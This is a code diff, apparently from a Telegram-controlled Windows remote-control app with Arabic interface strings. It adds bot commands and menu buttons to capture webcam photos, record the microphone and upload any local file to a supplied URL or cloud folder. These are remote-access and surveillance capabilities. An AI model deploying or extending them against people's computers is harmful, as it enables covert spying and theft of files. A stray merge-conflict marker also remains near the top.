@@ -1062,7 +1062,146 @@ class TelegramCommandService {
             ? '✅ <b>${res.message}</b>'
             : '❌ <b>فشل التحميل:</b> ${res.message}',
         chatId: chatId,
->>>>>>> 911907e (Add Siren alarm, remote browser opener, keystroke shortcuts, and background remote downloader)
+      );
+      return true;
+    }
+
+    if (lower == '/webcam' ||
+        lower == '/camera' ||
+        lower == 'كاميرا' ||
+        lower == 'ويبكام') {
+      await telegram.sendMessage(
+        '📸 <b>جاري التقاط صورة من كاميرا الويب...</b>',
+        chatId: chatId,
+        replyToMessageId: replyToMessageId,
+      );
+      final res = await executor.windowsControl.captureWebcamPhoto();
+      if (res.success && res.payload['filePath'] != null) {
+        final path = res.payload['filePath'].toString();
+        await telegram.sendPhoto(
+          filePath: path,
+          chatId: chatId,
+          caption:
+              '📸 <b>لقطة كاميرا الويب:</b>\n🖥️ $deviceName - ${DateTime.now()}',
+          replyToMessageId: replyToMessageId,
+        );
+      } else {
+        await telegram.sendMessage(
+          '⚠️ <b>تعذر التقاط صورة الكاميرا:</b> ${res.message}',
+          chatId: chatId,
+          replyToMessageId: replyToMessageId,
+        );
+      }
+      return true;
+    }
+
+    if (lower.startsWith('/mic') ||
+        lower.startsWith('/listen') ||
+        lower.startsWith('تسجيل') ||
+        lower.startsWith('ميكروفون')) {
+      final parts = text.split(RegExp(r'\s+'));
+      final secs = parts.length > 1 ? (int.tryParse(parts[1]) ?? 8) : 8;
+      await telegram.sendMessage(
+        '🎙️ <b>جاري تسجيل الصوت من ميكروفون الكمبيوتر لمدة $secs ثوانٍ...</b>',
+        chatId: chatId,
+        replyToMessageId: replyToMessageId,
+      );
+      final res =
+          await executor.windowsControl.recordMicrophoneAudio(seconds: secs);
+      if (res.success && res.payload['filePath'] != null) {
+        final path = res.payload['filePath'].toString();
+        await telegram.sendVoice(
+          filePath: path,
+          chatId: chatId,
+          caption: '🎙️ <b>تسجيل ميكروفون الكمبيوتر ($secs ث):</b>\n🖥️ $deviceName',
+          replyToMessageId: replyToMessageId,
+        );
+      } else {
+        await telegram.sendMessage(
+          '⚠️ <b>تعذر تسجيل الصوت:</b> ${res.message}',
+          chatId: chatId,
+          replyToMessageId: replyToMessageId,
+        );
+      }
+      return true;
+    }
+
+    if (lower.startsWith('/upload_to ') ||
+        lower.startsWith('/gdrive_upload ') ||
+        lower.startsWith('/onedrive_upload ') ||
+        lower.startsWith('/cloud_post ')) {
+      final args =
+          text.substring(text.indexOf(' ') + 1).trim().split(RegExp(r'\s+'));
+      if (args.length < 2) {
+        await telegram.sendMessage(
+          '⚠️ <b>طريقة الاستخدام:</b>\n<code>/upload_to &lt;مسار_الملف&gt; &lt;رابط_الرفع&gt;</code>\n\nمثال:\n<code>/upload_to C:\\Users\\Admin\\Documents\\report.pdf https://your-onedrive-or-gdrive-upload-url</code>',
+          chatId: chatId,
+          replyToMessageId: replyToMessageId,
+        );
+        return true;
+      }
+      final filePath = args.first;
+      final uploadUrl = args.sublist(1).join(' ').trim();
+      await telegram.sendMessage(
+        '⏳ <b>جاري رفع الملف إلى الرابط السحابي في الخلفية...</b>\n📁 الملف: <code>$filePath</code>',
+        chatId: chatId,
+        replyToMessageId: replyToMessageId,
+      );
+      final res = await executor.windowsControl
+          .uploadFileToCloudUrl(filePath, uploadUrl);
+      await telegram.sendMessage(
+        res.success
+            ? '✅ <b>${res.message}</b>'
+            : '❌ <b>فشل الرفع:</b> ${res.message}',
+        chatId: chatId,
+      );
+      return true;
+    }
+
+    if (lower.startsWith('/sync_onedrive ') ||
+        lower.startsWith('/to_onedrive ')) {
+      final filePath = text.substring(text.indexOf(' ') + 1).trim();
+      final res = await executor.windowsControl
+          .copyToCloudSyncFolder(filePath, provider: 'onedrive');
+      await telegram.sendMessage(
+        res.success
+            ? '☁️ <b>${res.message}</b>'
+            : '⚠️ <b>تعذر النسخ لـ OneDrive:</b> ${res.message}',
+        chatId: chatId,
+        replyToMessageId: replyToMessageId,
+      );
+      return true;
+    }
+
+    if (lower.startsWith('/sync_gdrive ') ||
+        lower.startsWith('/to_gdrive ')) {
+      final filePath = text.substring(text.indexOf(' ') + 1).trim();
+      final res = await executor.windowsControl
+          .copyToCloudSyncFolder(filePath, provider: 'gdrive');
+      await telegram.sendMessage(
+        res.success
+            ? '☁️ <b>${res.message}</b>'
+            : '⚠️ <b>تعذر النسخ لـ Google Drive:</b> ${res.message}',
+        chatId: chatId,
+        replyToMessageId: replyToMessageId,
+      );
+      return true;
+    }
+
+    if (lower.startsWith('/cloud_upload ') ||
+        lower.startsWith('/upload ')) {
+      final filePath = text.substring(text.indexOf(' ') + 1).trim();
+      await telegram.sendMessage(
+        '⏳ <b>جاري رفع الملف للسحابة في الخلفية...</b>\n📁 الملف: <code>$filePath</code>',
+        chatId: chatId,
+        replyToMessageId: replyToMessageId,
+      );
+      final res = await executor.windowsControl.uploadToFastCloud(filePath);
+      await telegram.sendMessage(
+        res.success
+            ? '☁️ <b>${res.message}</b>'
+            : '❌ <b>فشل الرفع:</b> ${res.message}',
+        chatId: chatId,
       );
       return true;
     }
@@ -1621,6 +1760,12 @@ class TelegramCommandService {
         return 'specs';
       case 'clip':
         return 'clip';
+      case 'webcam':
+        return '/webcam';
+      case 'mic':
+        return '/mic 10';
+      case 'alarm':
+        return '/alarm 10';
       case 'allow_install_15':
         return '/allow_install 15';
       case 'block_install':
@@ -1769,8 +1914,13 @@ class TelegramCommandService {
     rows.addAll([
       [
         button('📸 لقطة شاشة', 'screenshot'),
+        button('📷 كاميرا الويب', 'webcam'),
+        button('🎙️ ميكروفون', 'mic'),
+      ],
+      [
         button('📊 صحة الجهاز', 'health'),
         button('🖥️ مواصفات الجهاز', 'specs'),
+        button('🚨 صافرة إنذار', 'alarm'),
       ],
       [
         button('📁 مدير الملفات', 'menu_files'),
